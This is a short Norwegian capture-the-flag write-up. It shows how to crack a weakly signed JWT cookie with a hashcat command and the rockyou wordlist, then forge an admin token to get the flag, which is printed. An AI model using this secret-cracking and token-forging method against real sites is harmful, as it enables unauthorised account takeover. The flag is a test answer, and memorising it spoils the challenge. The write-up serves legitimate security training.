# Pålogging

Vi skulle gjerne fått logget på denne siden som `admin`..

[🔗 https://skatt-login.chals.io/](https://skatt-login.chals.io/)

# Writeup

Du får en JWT-cookie som `guest` selv ved feilet pålogging. 

Denne kan knekkes med f.eks. hashcat:
```
hashcat -a 0 -m 16500 JWT passordliste
```

Som passordliste er det vanlig å bruke [rockyou](https://weakpass.com/wordlists/rockyou.txt) i CTFer.
`cupcake7` vil dukke opp etter rundt 42k forsøk.

Da kan du ta JWT-payloaden:
```json
{
  "fresh": false,
  "iat": 1773154695,
  "jti": "88faeb04-b677-43cb-b533-44e9246aa2dd",
  "type": "access",
  "sub": "guest",
  "nbf": 1773154695,
  "exp": 1773155595
}

```

Erstatt `guest` med `admin` og signer cookie med `cupcake7` som secret. Reload siden for å få flagg.

# Flag

```
skatt{t0k3n_br0k3n!}
```